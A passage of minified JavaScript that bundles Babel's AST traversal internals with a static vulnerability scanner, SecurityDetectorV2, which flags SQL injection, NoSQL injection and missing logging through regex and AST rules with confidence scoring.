z=H[$],U=G.get(z);if(Array.isArray(U))Y.push(...U);else if(U.node)Y.push(U)}}return W}function $g1(X=!1){return this.getBindingIdentifierPaths(X,!0)}});var oL=m((aL)=>{Object.defineProperty(aL,"__esModule",{value:!0});aL.addComment=Pg1;aL.addComments=Sg1;aL.shareCommentsWithSiblings=Cg1;var Ng1=$0(),{addComment:wg1,addComments:Ig1}=Ng1;function Cg1(){if(typeof this.key==="string")return;let X=this.node;if(!X)return;let{trailingComments:Q,leadingComments:J}=X;if(!Q&&!J)return;let Y=this.getSibling(this.key-1),W=this.getSibling(this.key+1),G=Boolean(Y.node),H=Boolean(W.node);if(G){if(J)Y.addComments("trailing",nL(J,Y.node.trailingComments));if(Q&&!H)Y.addComments("trailing",Q)}if(H){if(Q)W.addComments("leading",nL(Q,W.node.leadingComments));if(J&&!G)W.addComments("leading",J)}}function nL(X,Q){if(!(Q!=null&&Q.length))return X;let J=new Set(Q);return X.filter((Y)=>{return!J.has(Y)})}function Pg1(X,Q,J){wg1(this.node,X,Q,J)}function Sg1(X,Q){Ig1(this.node,X,Q)}});var E8=m((QD)=>{Object.defineProperty(QD,"__esModule",{value:!0});QD.default=QD.SHOULD_STOP=QD.SHOULD_SKIP=QD.REMOVED=void 0;var kg1=fH(),bg1=FZ(),vg1=a4(),xg1=o$(),eL=$0(),nY=eL,fg1=eX(),hg1=xA(),e6=hA(),A5=HR(),R5=fz(),sL=JL(),z7=vL(),a0=uL(),XD=S6(),i0=XD,L5=uY(),X8=cY(),T9=rL(),$U=oL(),yg1=d$(),{validate:gg1}=eL,tL=bg1("babel"),OH0=QD.REMOVED=1,AH0=QD.SHOULD_STOP=2,RH0=QD.SHOULD_SKIP=4,T8=QD.default=class X{constructor(Q,J){this.contexts=[],this.state=null,this.opts=null,this._traverseFlags=0,this.skipKeys=null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this._store=null,this.parent=J,this.hub=Q,this.data=null,this.context=null,this.scope=null}get removed(){return(this._traverseFlags&1)>0}set removed(Q){if(Q)this._traverseFlags|=1;else this._traverseFlags&=-2}get shouldStop(){return(this._traverseFlags&2)>0}set shouldStop(Q){if(Q)this._traverseFlags|=2;else this._traverseFlags&=-3}get shouldSkip(){return(this._traverseFlags&4)>0}set shouldSkip(Q){if(Q)this._traverseFlags|=4;else this._traverseFlags&=-5}static get({hub:Q,parentPath:J,parent:Y,container:W,listKey:G,key:H}){if(!Q&&J)Q=J.hub;if(!Y)throw Error("To get a node path the parent needs to exist");let $=W[H],z=fg1.getOrCreateCachedPaths(Y,J),U=z.get($);if(!U){if(U=new X(Q,Y),$)z.set($,U)}return XD.setup.call(U,J,W,G,H),U}getScope(Q){return this.isScope()?new xg1.default(this):Q}setData(Q,J){if(this.data==null)this.data=Object.create(null);return this.data[Q]=J}getData(Q,J){if(this.data==null)this.data=Object.create(null);let Y=this.data[Q];if(Y===void 0&&J!==void 0)Y=this.data[Q]=J;return Y}hasNode(){return this.node!=null}buildCodeFrameError(Q,J=SyntaxError){return this.hub.buildError(this.node,Q,J)}traverse(Q,J){(0,vg1.default)(this.node,Q,this.scope,J,this)}set(Q,J){gg1(this.node,Q,J),this.node[Q]=J}getPathLocation(){let Q=[],J=this;do{let Y=J.key;if(J.inList)Y=`${J.listKey}[${Y}]`;Q.unshift(Y)}while(J=J.parentPath);return Q.join(".")}debug(Q){if(!tL.enabled)return;tL(`${this.getPathLocation()} ${this.type}: ${Q}`)}toString(){return(0,hg1.default)(this.node).code}get inList(){return!!this.listKey}set inList(Q){if(!Q)this.listKey=null}get parentKey(){return this.listKey||this.key}},mg1={findParent:e6.findParent,find:e6.find,getFunctionParent:e6.getFunctionParent,getStatementParent:e6.getStatementParent,getEarliestCommonAncestorFrom:e6.getEarliestCommonAncestorFrom,getDeepestCommonAncestorFrom:e6.getDeepestCommonAncestorFrom,getAncestry:e6.getAncestry,isAncestor:e6.isAncestor,isDescendant:e6.isDescendant,inType:e6.inType,getTypeAnnotation:A5.getTypeAnnotation,isBaseType:A5.isBaseType,couldBeBaseType:A5.couldBeBaseType,baseTypeStrictlyMatches:A5.baseTypeStrictlyMatches,isGenericType:A5.isGenericType,replaceWithMultiple:R5.replaceWithMultiple,replaceWithSourceString:R5.replaceWithSourceString,replaceWith:R5.replaceWith,replaceExpressionWithStatements:R5.replaceExpressionWithStatements,replaceInline:R5.replaceInline,evaluateTruthy:sL.evaluateTruthy,evaluate:sL.evaluate,toComputedKey:z7.toComputedKey,ensureBlock:z7.ensureBlock,unwrapFunctionEnvironment:z7.unwrapFunctionEnvironment,arrowFunctionToExpression:z7.arrowFunctionToExpression,splitExportDeclaration:z7.splitExportDeclaration,ensureFunctionName:z7.ensureFunctionName,matchesPattern:a0.matchesPattern,isStatic:a0.isStatic,isNodeType:a0.isNodeType,canHaveVariableDeclarationOrExpression:a0.canHaveVariableDeclarationOrExpression,canSwapBetweenExpressionAndStatement:a0.canSwapBetweenExpressionAndStatement,isCompletionRecord:a0.isCompletionRecord,isStatementOrBlock:a0.isStatementOrBlock,referencesImport:a0.referencesImport,getSource:a0.getSource,willIMaybeExecuteBefore:a0.willIMaybeExecuteBefore,_guessExecutionStatusRelativeTo:a0._guessExecutionStatusRelativeTo,resolve:a0.resolve,isConstantExpression:a0.isConstantExpression,isInStrictMode:a0.isInStrictMode,isDenylisted:i0.isDenylisted,visit:i0.visit,skip:i0.skip,skipKey:i0.skipKey,stop:i0.stop,setContext:i0.setContext,requeue:i0.requeue,requeueComputedKeyAndDecorators:i0.requeueComputedKeyAndDecorators,remove:L5.remove,insertBefore:X8.insertBefore,insertAfter:X8.insertAfter,unshiftContainer:X8.unshiftContainer,pushContainer:X8.pushContainer,getOpposite:T9.getOpposite,getCompletionRecords:T9.getCompletionRecords,getSibling:T9.getSibling,getPrevSibling:T9.getPrevSibling,getNextSibling:T9.getNextSibling,getAllNextSiblings:T9.getAllNextSiblings,getAllPrevSiblings:T9.getAllPrevSiblings,get:T9.get,getAssignmentIdentifiers:T9.getAssignmentIdentifiers,getBindingIdentifiers:T9.getBindingIdentifiers,getOuterBindingIdentifiers:T9.getOuterBindingIdentifiers,getBindingIdentifierPaths:T9.getBindingIdentifierPaths,getOuterBindingIdentifierPaths:T9.getOuterBindingIdentifierPaths,shareCommentsWithSiblings:$U.shareCommentsWithSiblings,addComment:$U.addComment,addComments:$U.addComments};Object.assign(T8.prototype,mg1);T8.prototype.arrowFunctionToShadowed=z7[String("arrowFunctionToShadowed")],Object.assign(T8.prototype,{has:a0[String("has")],is:a0[String("is")],isnt:a0[String("isnt")],equals:a0[String("equals")],hoist:X8[String("hoist")],updateSiblingKeys:X8.updateSiblingKeys,call:i0.call,isBlacklisted:i0[String("isBlacklisted")],setScope:i0.setScope,resync:i0.resync,popContext:i0.popContext,pushContext:i0.pushContext,setup:i0.setup,setKey:i0.setKey});T8.prototype._guessExecutionStatusRelativeToDifferentFunctions=a0._guessExecutionStatusRelativeTo,T8.prototype._guessExecutionStatusRelativeToDifferentFunctions=a0._guessExecutionStatusRelativeTo,Object.assign(T8.prototype,{_getTypeAnnotation:A5._getTypeAnnotation,_replaceWith:R5._replaceWith,_resolve:a0._resolve,_call:i0._call,_resyncParent:i0._resyncParent,_resyncKey:i0._resyncKey,_resyncList:i0._resyncList,_resyncRemoved:i0._resyncRemoved,_getQueueContexts:i0._getQueueContexts,_removeFromScope:L5._removeFromScope,_callRemovalHooks:L5._callRemovalHooks,_remove:L5._remove,_markRemoved:L5._markRemoved,_assertUnremoved:L5._assertUnremoved,_containerInsert:X8._containerInsert,_containerInsertBefore:X8._containerInsertBefore,_containerInsertAfter:X8._containerInsertAfter,_verifyNodeList:X8._verifyNodeList,_getKey:T9._getKey,_getPattern:T9._getPattern});for(let X of nY.TYPES){let Q=`is${X}`,J=nY[Q];T8.prototype[Q]=function(Y){return J(this.node,Y)},T8.prototype[`assert${X}`]=function(Y){if(!J(this.node,Y))throw TypeError(`Expected node path of type ${X}`)}}Object.assign(T8.prototype,yg1);for(let X of Object.keys(kg1)){if(X[0]==="_")continue;if(!nY.TYPES.includes(X))nY.TYPES.push(X)}});var HD=m((WD)=>{Object.defineProperty(WD,"__esModule",{value:!0});WD.default=void 0;var pg1=E8(),dg1=$0(),zU=S6(),{VISITOR_KEYS:ig1}=dg1;class YD{constructor(X,Q,J,Y){this.queue=null,this.priorityQueue=null,this.parentPath=Y,this.scope=X,this.state=J,this.opts=Q}shouldVisit(X){let Q=this.opts;if(Q.enter||Q.exit)return!0;if(Q[X.type])return!0;let J=ig1[X.type];if(!(J!=null&&J.length))return!1;for(let Y of J)if(X[Y])return!0;return!1}create(X,Q,J,Y){return pg1.default.get({parentPath:this.parentPath,parent:X,container:Q,key:J,listKey:Y})}maybeQueue(X,Q){if(this.queue)if(Q)this.queue.push(X);else this.priorityQueue.push(X)}visitMultiple(X,Q,J){if(X.length===0)return!1;let Y=[];for(let W=0;W<X.length;W++){let G=X[W];if(G&&this.shouldVisit(G))Y.push(this.create(Q,X,W,J))}return this.visitQueue(Y)}visitSingle(X,Q){if(this.shouldVisit(X[Q]))return this.visitQueue([this.create(X,X,Q)]);else return!1}visitQueue(X){this.queue=X,this.priorityQueue=[];let Q=new WeakSet,J=!1,Y=0;for(;Y<X.length;){let W=X[Y];if(Y++,zU.resync.call(W),W.contexts.length===0||W.contexts[W.contexts.length-1]!==this)zU.pushContext.call(W,this);if(W.key===null)continue;let{node:G}=W;if(Q.has(G))continue;if(G)Q.add(G);if(W.visit()){J=!0;break}if(this.priorityQueue.length){if(J=this.visitQueue(this.priorityQueue),this.priorityQueue=[],this.queue=X,J)break}}for(let W=0;W<Y;W++)zU.popContext.call(X[W]);return this.queue=null,J}visit(X,Q){let J=X[Q];if(!J)return!1;if(Array.isArray(J))return this.visitMultiple(J,X,Q);else return this.visitSingle(X,Q)}}WD.default=YD});var LY=m(($D)=>{Object.defineProperty($D,"__esModule",{value:!0});$D.traverseNode=og1;var rg1=HD(),NH0=E8(),ng1=$0(),wH0=S6(),{VISITOR_KEYS:ag1}=ng1;function og1(X,Q,J,Y,W,G,H){let $=ag1[X.type];if(!$)return!1;let z=new rg1.default(J,Q,Y,W);if(H){if(G!=null&&G[W.parentKey])return!1;return z.visitQueue([W])}for(let U of $){if(G!=null&&G[U])continue;if(z.visit(X,U))return!0}return!1}});var S6=m((MD)=>{Object.defineProperty(MD,"__esModule",{value:!0});MD._call=KU;MD._getQueueContexts=qm1;MD._resyncKey=qD;MD._resyncList=ZD;MD._resyncParent=BD;MD._resyncRemoved=$m1;MD.call=UU;MD.isDenylisted=KD;MD.popContext=zm1;MD.pushContext=Um1;MD.requeue=Vm1;MD.requeueComputedKeyAndDecorators=Bm1;MD.resync=Hm1;MD.setContext=Gm1;MD.setKey=aY;MD.setScope=VD;MD.setup=Km1;MD.skip=Jm1;MD.skipKey=Ym1;MD.stop=Wm1;MD.visit=Qm1;var tg1=LY(),zD=E8(),eg1=uY(),Xm1=$0();function UU(X){let Q=this.opts;if(this.debug(X),this.node){if(KU.call(this,Q[X]))return!0}if(this.node){var J;return KU.call(this,(J=Q[this.node.type])==null?void 0:J[X])}return!1}function KU(X){if(!X)return!1;for(let Q of X){if(!Q)continue;let J=this.node;if(!J)return!0;let Y=Q.call(this.state,this,this.state);if(Y&&typeof Y==="object"&&typeof Y.then==="function")throw Error("You appear to be using a plugin with an async traversal visitor, which your current version of Babel does not support. If you're using a published plugin, you may need to upgrade your @babel/core version.");if(Y)throw Error(`Unexpected return value from visitor method ${Q}`);if(this.node!==J)return!0;if(this._traverseFlags>0)return!0}return!1}function KD(){var X;let Q=(X=this.opts.denylist)!=null?X:this.opts.blacklist;return Q==null?void 0:Q.includes(this.node.type)}MD.isBlacklisted=KD;function UD(X,Q){if(X.context!==Q)X.context=Q,X.state=Q.state,X.opts=Q.opts}function Qm1(){var X,Q;if(!this.node)return!1;if(this.isDenylisted())return!1;if((X=(Q=this.opts).shouldSkip)!=null&&X.call(Q,this))return!1;let J=this.context;if(this.shouldSkip||UU.call(this,"enter"))return this.debug("Skip..."),this.shouldStop;return UD(this,J),this.debug("Recursing into..."),this.shouldStop=(0,tg1.traverseNode)(this.node,this.opts,this.scope,this.state,this,this.skipKeys),UD(this,J),UU.call(this,"exit"),this.shouldStop}function Jm1(){this.shouldSkip=!0}function Ym1(X){if(this.skipKeys==null)this.skipKeys={};this.skipKeys[X]=!0}function Wm1(){this._traverseFlags|=zD.SHOULD_SKIP|zD.SHOULD_STOP}function VD(){var X,Q;if((X=this.opts)!=null&&X.noScope)return;let J=this.parentPath;if((this.key==="key"||this.listKey==="decorators")&&J.isMethod()||this.key==="discriminant"&&J.isSwitchStatement())J=J.parentPath;let Y;while(J&&!Y){var W;if((W=J.opts)!=null&&W.noScope)return;Y=J.scope,J=J.parentPath}this.scope=this.getScope(Y),(Q=this.scope)==null||Q.init()}function Gm1(X){if(this.skipKeys!=null)this.skipKeys={};if(this._traverseFlags=0,X)this.context=X,this.state=X.state,this.opts=X.opts;return VD.call(this),this}function Hm1(){if(this.removed)return;BD.call(this),ZD.call(this),qD.call(this)}function BD(){if(this.parentPath)this.parent=this.parentPath.node}function qD(){if(!this.container)return;if(this.node===this.container[this.key])return;if(Array.isArray(this.container)){for(let X=0;X<this.container.length;X++)if(this.container[X]===this.node){aY.call(this,X);return}}else for(let X of Object.keys(this.container))if(this.container[X]===this.node){aY.call(this,X);return}this.key=null}function ZD(){if(!this.parent||!this.inList)return;let X=this.parent[this.listKey];if(this.container===X)return;this.container=X||null}function $m1(){if(this.key==null||!this.container||this.container[this.key]!==this.node)eg1._markRemoved.call(this)}function zm1(){if(this.contexts.pop(),this.contexts.length>0)this.setContext(this.contexts[this.contexts.length-1]);else this.setContext(void 0)}function Um1(X){this.contexts.push(X),this.setContext(X)}function Km1(X,Q,J,Y){this.listKey=J,this.container=Q,this.parentPath=X||this.parentPath,aY.call(this,Y)}function aY(X){var Q;this.key=X,this.node=this.container[this.key],this.type=(Q=this.node)==null?void 0:Q.type}function Vm1(X=this){if(X.removed)return;let Q=this.contexts;for(let J of Q)J.maybeQueue(X)}function Bm1(){let{context:X,node:Q}=this;if(!Xm1.isPrivate(Q)&&Q.computed)X.maybeQueue(this.get("key"));if(Q.decorators)for(let J of this.get("decorators"))X.maybeQueue(J)}function qm1(){let X=this,Q=this.contexts;while(!Q.length){if(X=X.parentPath,!X)break;Q=X.contexts}return Q}});var AD=m((FD)=>{Object.defineProperty(FD,"__esModule",{value:!0});FD.default=void 0;class jD{getCode(){}getScope(){}addHelper(){throw Error("Helpers are not supported by the default hub.")}buildError(X,Q,J=TypeError){return new J(Q)}}FD.default=jD});var a4=m((VQ)=>{Object.defineProperty(VQ,"__esModule",{value:!0});Object.defineProperty(VQ,"Hub",{enumerable:!0,get:function(){return gm1.default}});Object.defineProperty(VQ,"NodePath",{enumerable:!0,get:function(){return hm1.default}});Object.defineProperty(VQ,"Scope",{enumerable:!0,get:function(){return ym1.default}});VQ.visitors=VQ.default=void 0;S6();var KQ=AY();VQ.visitors=KQ;var xm1=$0(),fm1=eX(),RD=LY(),hm1=E8(),ym1=o$(),gm1=AD(),{VISITOR_KEYS:mm1,removeProperties:um1,traverseFast:UQ}=xm1;function _6(X,Q={},J,Y,W,G){if(!X)return;if(!Q.noScope&&!J){if(X.type!=="Program"&&X.type!=="File")throw Error(`You must pass a scope and parentPath unless traversing a Program/File. Instead of that you tried to traverse a ${X.type} node without passing scope and parentPath.`)}if(!W&&G)throw Error("visitSelf can only be used when providing a NodePath.");if(!mm1[X.type])return;KQ.explode(Q),(0,RD.traverseNode)(X,Q,J,Y,W,null,G)}var EH0=VQ.default=_6;_6.visitors=KQ;_6.verify=KQ.verify;_6.explode=KQ.explode;_6.cheap=function(X,Q){UQ(X,Q);return};_6.node=function(X,Q,J,Y,W,G){(0,RD.traverseNode)(X,Q,J,Y,W,G)};_6.clearNode=function(X,Q){um1(X,Q)};_6.removeProperties=function(X,Q){return UQ(X,_6.clearNode,Q),X};_6.hasType=function(X,Q,J){if(J!=null&&J.includes(X.type))return!1;if(X.type===Q)return!0;return UQ(X,function(Y){if(J!=null&&J.includes(Y.type))return UQ.skip;if(Y.type===Q)return UQ.stop})};_6.cache=fm1});class D5{static match(X,Q,J={}){let{maxMatches:Y=lm1,timeoutMs:W=VU,patternId:G="unknown",filePath:H="unknown"}=J,$=[],z=Date.now(),U=!1,K=!1,B=0;X.lastIndex=0;try{let Z;while((Z=X.exec(Q))!==null){if(B++,B>Y){K=!0,V.warn(`Pattern ${G} exceeded max matches (${Y}) in ${H}`);break}if(Date.now()-z>W){U=!0,V.warn(`Pattern ${G} exceeded timeout (${W}ms) in ${H}`);break}let M=this.getLineNumber(Q,Z.index),L=Z.index-Q.lastIndexOf(`
`,Z.index-1)-1;if($.push({match:Z,lineNumber:M,column:L}),!X.global)break;if(Z.index===X.lastIndex)X.lastIndex++}}catch(Z){V.error(`Error executing regex pattern ${G} in ${H}:`,Z)}let q=Date.now()-z;return{matches:$,timedOut:U,hitMaxMatches:K,totalMatches:B,durationMs:q}}static getLineNumber(X,Q){return X.substring(0,Q).split(`
`).length}static getLineContent(X,Q){return X.split(`
`)[Q-1]?.trim()||""}}var VU=5000,DD=30000,lm1=1000;var BU=$1(()=>{y1()});class ZU{astCache=new WeakMap;activeTraversals=new Set;cleanup(){if(this.activeTraversals.clear(),this.astCache=new WeakMap,typeof global<"u"&&rm1(global))global.gc()}async scanFile(X,Q,J){let Y=[];if(this.isTestFile(X))return[];console.log(`[AST] Scanning file: ${X}`),console.log(`[AST] Total patterns: ${J.length}`);let W=J.filter((H)=>{if(H.patterns?.regex&&H.patterns.regex.length>0){let $=H.patterns.regex.some((z)=>z.test(Q));if($)console.log(`[AST] Pattern ${H.id} matched via regex`);return $}return!1});if(console.log(`[AST] Candidate patterns after regex filter: ${W.length}`),W.length===0)return Y;if(this.isJavaScriptFile(X)){let H=null;try{H=CD.parse(Q,{sourceType:"module",plugins:["jsx","typescript"],errorRecovery:!0})}catch($){return this.regexOnlyFallback(X,Q,W)}try{for(let $ of W)if($.astRules){console.log(`[AST] Applying AST rules for pattern ${$.id}`);let z=this.applyASTPattern(H,$,X,Q);console.log(`[AST] Found ${z.length} issues with AST rules`),Y.push(...z)}else{console.log(`[AST] Pattern ${$.id} has no AST rules, using regex`);let z=this.applyRegexPattern(Q,$,X);Y.push(...z)}}finally{H=null}}else return this.regexOnlyFallback(X,Q,W);return Y.filter((H)=>H.confidence>=(H.pattern.minConfidence??im1))}applyASTPattern(X,Q,J,Y){let W=[],G=Q.astRules,H=this,$={ast:X,active:!0};this.activeTraversals.add($);try{PD.default(X,{enter(z){if(G.node_type&&z.node.type!==G.node_type)return;let U=!1,K=Q.confidenceRules?.base||0.8,B=Q.type.toLowerCase().replace(/_/g," "),q=z.node?.loc,Z=z.node?.start,M=z.node?.end;switch(B){case"sql injection":U=H.checkSQLInjection(z,G,Q);break;case"logging":U=H.checkMissingLogging(z,G,Q);break;case"nosql injection":U=H.checkNoSQLInjection(z,G,Q);break;default:U=H.checkGenericPattern(z,G,Q)}if(U){if(K=H.calculateConfidence(z,K,Q.confidenceRules?.adjustments||{}),q)W.push({pattern:Q,file:J,line:q.start.line,column:q.start.column,code:Y.substring(Z||0,M||0),confidence:K})}}})}finally{$.active=!1,this.activeTraversals.delete($)}return W}checkSQLInjection(X,Q,J){let Y=X.node;if(d1.isBinaryExpression(Y)&&Y.operator==="+"){let W=this.getFullConcatenatedString(X),G=qU.test(W);if(console.log(`[AST] SQL check: BinaryExpression found, hasSQL=${G}, expression="${W}"`),G&&this.hasConcatenatedUserInput(X)){if(this.isInDatabaseCall(X)||this.isAssignedToQueryVariable(X))return![J.contextRules?.exclude_if_parameterized&&this.isParameterizedQuery(X),J.contextRules?.exclude_if_logging_only&&this.isOnlyUsedForLogging(X)].some(Boolean)}}if(d1.isTemplateLiteral(Y)){let W=Y.quasis.some((H)=>qU.test(H.value.raw)),G=Y.expressions.some((H)=>this.containsUserInput(H,X));if(W&&G)return!(J.contextRules?.exclude_if_parameterized&&this.isParameterizedQuery(X))}return!1}checkMissingLogging(X,Q,J){let Y=X.node;if(!d1.isFunctionDeclaration(Y))return!1;if(Q.name_matches&&Y.id){if(!new RegExp(Q.name_matches).test(Y.id.name))return!1;let G=this.getBodyString(Y);if(new RegExp(Q.body_excludes||"log|logger").test(G))return!1;if(J.contextRules?.exclude_if_delegates){if(this.delegatesToOtherFunction(Y))return!1}return!0}return!1}checkNoSQLInjection(X,Q,J){let Y=X.node;if(!d1.isCallExpression(Y))return!1;if(d1.isMemberExpression(Y.callee)&&d1.isIdentifier(Y.callee.property)){let W=Y.callee.property.name;if(!Q.method_names?.includes(W))return!1;let G=Y.arguments[0];if(d1.isObjectExpression(G)){if(G.properties.some((z)=>d1.isObjectProperty(z)&&d1.isIdentifier(z.key)&&Q.argument_contains?.dangerous_keys?.includes(z.key.name)))return!0;return G.properties.some((z)=>d1.isObjectProperty(z)?this.containsUserInput(z.value,X):!1)}}return!1}checkGenericPattern(X,Q,J){return!1}traverseAncestors(X,Q,J=dm1){let Y=X,W=0;while(Y&&W<J){let G=Y.parentPath;if(!G)break;if(Q(G.node))return!0;Y=G,W++}return!1}isTestFile(X){return[/\.test\.[jt]sx?$/,/\.spec\.[jt]sx?$/,/\/__tests__\//,/\/test\//,/\/spec\//].some((J)=>J.test(X))}isJavaScriptFile(X){return[/\.[jt]sx?$/,/\.mjs$/,/\.cjs$/].some((J)=>J.test(X))}isInDatabaseCall(X){return this.traverseAncestors(X,(Q)=>{if(d1.isCallExpression(Q)&&d1.isMemberExpression(Q.callee)){let J=Q.callee.property;return d1.isIdentifier(J)&&pm1.includes(J.name)}return!1})}containsUserInput(X,Q,J=0){if(!X||J>wD)return!1;if(d1.isMemberExpression(X)){let Y=this.getObjectName(X);return ND.includes(Y)}if(d1.isIdentifier(X))try{let Y=Q.scope.getBinding(X.name);if(Y?.path.isVariableDeclarator()){let W=Y.path.node.init;if(d1.isMemberExpression(W)){let G=this.getObjectName(W);return ND.includes(G)}}}catch{}return!1}getObjectName(X){if(d1.isMemberExpression(X)&&d1.isIdentifier(X.object))return X.object.name;return""}isParameterizedQuery(X){let Q=X.parent;if(d1.isCallExpression(Q))return Q.arguments.length>1||d1.isTemplateLiteral(Q.arguments[0])&&Q.arguments[0].quasis.some((J)=>J.value.raw.includes("?"));return!1}getBodyString(X){return ID(X)?X.body.body.map((Q)=>Q.type).join(" "):""}delegatesToOtherFunction(X){return ID(X)&&X.body.body.some((Q)=>d1.isReturnStatement(Q)&&d1.isCallExpression(Q.argument))}calculateConfidence(X,Q,J){let Y=Q,W={direct_req_param_concat:this.hasConcatenatedUserInput(X),within_db_query_call:this.isInDatabaseCall(X)||this.isAssignedToQueryVariable(X),has_sql_keywords:d1.isBinaryExpression(X.node)&&qU.test(this.getFullConcatenatedString(X)),is_console_log:this.isInConsoleLog(X),direct_user_input:this.hasDirectUserInput(X),has_validation:this.hasValidation(X),is_test_code:this.isInTestCode(X),in_test_file:this.isTestFile("")};for(let[G,H]of Object.entries(W))if(J[G]&&H)Y+=J[G];return Math.max(0,Math.min(1,Y))}hasDirectUserInput(X){return!1}hasValidation(X){return!1}isInTestCode(X){return!1}getFullConcatenatedString(X){let Q=X.node;if(d1.isBinaryExpression(Q)){let J=[];if(d1.isStringLiteral(Q.left))J.push(Q.left.value);if(d1.isStringLiteral(Q.right))J.push(Q.right.value);else if(d1.isIdentifier(Q.right))J.push("USER_INPUT");return J.join("")}return""}hasConcatenatedUserInput(X){let Q=X.node;if(!d1.isBinaryExpression(Q))return!1;let J=Q.right;if(d1.isIdentifier(J))return!0;if(d1.isMemberExpression(J)&&d1.isMemberExpression(J.object)){let Y=J.object;if(d1.isIdentifier(Y.object)&&Y.object.name==="req"){let G=Y.property;return d1.isIdentifier(G)&&["params","query","body"].includes(G.name)}}return!1}isAssignedToQueryVariable(X){let Q=X.parent;if(d1.isVariableDeclarator(Q)&&Q.init===X.node){if(d1.isIdentifier(Q.id)){let J=Q.id.name.toLowerCase();return J.includes("query")||J.includes("sql")}}return!1}isInConsoleLog(X){return this.traverseAncestors(X,(Q)=>{if(d1.isCallExpression(Q)){let J=Q.callee;return d1.isMemberExpression(J)&&d1.isIdentifier(J.object)&&J.object.name==="console"&&d1.isIdentifier(J.property)&&J.property.name==="log"}return!1},wD)}isOnlyUsedForLogging(X){let Q=X.parent;if(d1.isVariableDeclarator(Q)&&Q.init===X.node&&d1.isIdentifier(Q.id)){let J=Q.id.name,Y=X.scope.getBinding(J);if(!Y)return!1;return Y.referencePaths.every((G)=>{return this.isInConsoleLog(G)})}return this.isInConsoleLog(X)}regexOnlyFallback(X,Q,J){let Y=[];for(let W of J){let G=this.applyRegexPattern(Q,W,X);Y.push(...G)}return Y}applyRegexPattern(X,Q,J){let Y=[];if(!Q.patterns?.regex)return Y;for(let W of Q.patterns.regex){let G=D5.match(W,X,{patternId:Q.id,filePath:J});for(let{match:H,lineNumber:$,column:z}of G.matches)Y.push({pattern:Q,file:J,line:$,column:z,code:H[0],confidence:Q.confidenceRules?.base||0.8})}return Y}}var CD,PD,d1,qU,ND,pm1,dm1=10,wD=5,im1=0.7,rm1=(X)=>typeof X.gc==="function",ID=(X)=>d1.isFunctionDeclaration(X)&&X.body!==null&&d1.isBlockStatement(X.body);var SD=$1(()=>{BU();CD=C0(tJ(),1),PD=C0(a4(),1),d1=C0($0(),1),qU=/\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b/i,ND=["req","request","params","query","body"],pm1=["query","execute","exec","run","all","get"]});var ED={};Y9(ED,{securityDetector:()=>nm1,SecurityDetectorV2:()=>U7});class U7{patternSource;cachedPatterns=new Map;astInterpreter;constructor(X){this.patternSource=X||L8(),this.astInterpreter=new ZU}cleanup(){if(this.cachedPatterns.clear(),this.astInterpreter)this.astInterpreter.cleanup()}async detect(X,Q,J="unknown"){let Y=[],W=new Set,G=Date.now();try{let H=await this.patternSource.getPatternsByLanguage(Q);V.info(`SecurityDetectorV2: Analyzing ${Q} code with ${H.length} patterns in file ${J}`);let $=H.filter((K)=>K.astRules),z=H.filter((K)=>!K.astRules);await this.processASTPatterns($,X,J,W,Y),await this.processRegexPatterns(z,X,Q,J,G,W,Y);let U=Date.now()-G;V.info(`SecurityDetectorV2: Completed ${J} in ${U}ms, found ${Y.length} vulnerabilities`)}catch(H){V.error(`Error detecting vulnerabilities in ${J}:`,H)}return Y}async processASTPatterns(X,Q,J,Y,W){if(X.length===0)return;V.info(`SecurityDetectorV2: Processing ${X.length} AST patterns for ${J}`);try{let G=Date.now(),H=await Promise.race([this.astInterpreter.scanFile(J,Q,X),new Promise((z,U)=>setTimeout(()=>U(Error("AST scan timeout")),VU*X.length))]),$=Date.now()-G;V.info(`SecurityDetectorV2: AST scan completed in ${$}ms, found ${H.length} findings`);for(let z of H){let U=`${z.line}:${z.pattern.type}`;if(!Y.has(U)){Y.add(U);let K=z.confidence<=1?Math.round(z.confidence*100):Math.round(z.confidence);W.push({type:z.pattern.type,severity:z.pattern.severity,line:z.line,message:`${z.pattern.name}: ${z.pattern.description}`,description:z.pattern.description,confidence:K,cweId:z.pattern.cweId,owaspCategory:z.pattern.owaspCategory,remediation:z.pattern.remediation})}}}catch(G){V.error(`AST pattern processing failed for ${J}:`,G)}}buildCommentMap(X){let Q=new Set,J=X.split(`
`),Y=!1;for(let W=0;W<J.length;W++){let G=W+1,H=J[W].trimStart();if(Y){if(Q.add(G),H.includes("*/"))Y=!1;continue}if(H.startsWith("//")){Q.add(G);continue}if(H.startsWith("/*")){if(Q.add(G),!H.substring(2).includes("*/"))Y=!0;continue}}return Q}async processRegexPatterns(X,Q,J,Y,W,G,H){V.info(`SecurityDetectorV2: Processing ${X.length} regex patterns for ${Y}`);let $=this.buildCommentMap(Q);for(let z=0;z<X.length;z++){let U=X[z];if(Date.now()-W>DD){V.warn(`Per-file timeout exceeded for ${Y} after ${z}/${X.length} patterns`);break}if(z%5===0)V.info(`SecurityDetectorV2: Processing pattern ${z+1}/${X.length} (${U.id}) for ${Y}`);if(!U.patterns?.regex)continue;try{this.processPattern(U,Q,J,Y,G,H,$)}catch(K){V.error(`Error processing pattern ${U.id} in ${Y}:`,K)}}}processPattern(X,Q,J,Y,W,G,H){let $=Date.now();for(let U of X.patterns.regex){let K=D5.match(U,Q,{patternId:X.id,filePath:Y});for(let{match:B,lineNumber:q}of K.matches){if(H&&H.has(q))continue;let Z=D5.getLineContent(Q,q);if(X.id==="ruby-sql-injection"&&J==="ruby")V.info(`Ruby SQL match found at line ${q}: "${Z}"`);if(this.isSafeUsage(Z,X.type)){if(X.id==="ruby-sql-injection"&&J==="ruby")V.info("  Skipped as safe usage");continue}let M=`${q}:${X.type}`;if(W.has(M))continue;W.add(M);let L={type:X.type,severity:X.severity,line:q,message:`${X.name}: ${X.description}`,description:X.description,confidence:this.getConfidence(Z,X.type),cweId:X.cweId,owaspCategory:X.owaspCategory,remediation:X.remediation,snippet:Z};if(X.id==="ruby-sql-injection"&&J==="ruby")V.info("  Adding vulnerability:",L);G.push(L)}}let z=Date.now()-$;if(z>1000)V.warn(`Pattern ${X.id} took ${z}ms in ${Y}`)}async detectIssues(X){return(await this.detect(X.content,X.language,X.filePath)).map((J)=>({patternId:J.cweId||`${J.type}-001`,severity:J.severity,line:J.line,column:1,message:J.message,description:J.description,file:X.filePath,type:J.type,remediation:J.remediation,confidence:J.confidence}))}async scanDirectory(X){return V.info(`SecurityDetectorV2: Starting directory scan of 